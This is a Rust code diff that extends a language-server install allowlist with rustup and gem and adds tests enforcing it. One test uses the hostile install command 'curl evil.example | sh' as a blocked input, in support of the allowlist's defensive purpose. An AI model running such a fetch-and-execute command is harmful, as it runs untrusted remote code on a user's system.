@@ -106,8 +106,9 @@ const LSP_INSTALL_BINARIES: &[&str] = &[
     "brew", "port", // Node
     "npm", "yarn", "pnpm", // Python
     "pip", "pip3",  // Go
-    "go",    // Rust
-    "cargo", // Snap / Flatpak
+    "go",    // Rust (the recipe runs `rustup component add rust-analyzer`)
+    "cargo", "rustup", // Ruby (the recipe runs `gem install solargraph`)
+    "gem", // Snap / Flatpak
     "snap", "flatpak", // openSUSE
     "zypper",  // Gentoo
     "emerge",
@@ -2286,6 +2287,60 @@ mod circuit_breaker_tests {
             !m.restart_budget.contains_key(binary),
             "ProcessExited on an already-unavailable binary is a no-op"
         );
+    }
+}
+
+#[cfg(test)]
+mod install_allowlist_tests {
+    //! The install-command allowlist is a security boundary (see the
+    //! `LSP_INSTALL_BINARIES` comment): only curated package managers
+    //! may run at server startup. The flip side of that property is
+    //! that every recipe the registry ships must actually pass the
+    //! gate — a blocked recipe makes `install_language_server` for
+    //! that language unconditionally fail (this is how the rust
+    //! recipe shipped without `rustup` on the list).
+
+    use super::*;
+
+    #[test]
+    fn every_registry_recipe_passes_the_allowlist() {
+        for (ext, cfg) in LANGUAGE_MAP.iter() {
+            if let Some(cmd) = cfg.install_cmd {
+                let ls = LanguageServer {
+                    binary: cfg.binary,
+                    install_cmd: cfg.install_cmd,
+                };
+                match ls.install_argv() {
+                    Ok(_) => {}
+                    // A recipe can be gated per platform (clangd installs
+                    // through brew, macOS only) before the allowlist is
+                    // consulted — that gate is not what this test is about.
+                    Err(e) if e.to_string().contains("allowlist") => {
+                        panic!("the .{ext} recipe ({cmd}) is blocked by the install allowlist: {e}")
+                    }
+                    Err(_) => {}
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn the_rust_recipe_installs_through_rustup() {
+        let rust = language_server_for("rust").expect("rust has a language server");
+        assert_eq!(
+            rust.install_argv().expect("rustup must be on the allowlist"),
+            vec!["rustup", "component", "add", "rust-analyzer"]
+        );
+    }
+
+    #[test]
+    fn binaries_outside_the_allowlist_are_refused() {
+        let evil = LanguageServer {
+            binary: "sh",
+            install_cmd: Some("curl evil.example | sh"),
+        };
+        let err = evil.install_argv().expect_err("curl must not be runnable");
+        assert!(err.to_string().contains("allowlist"), "{err}");
     }
 }
 
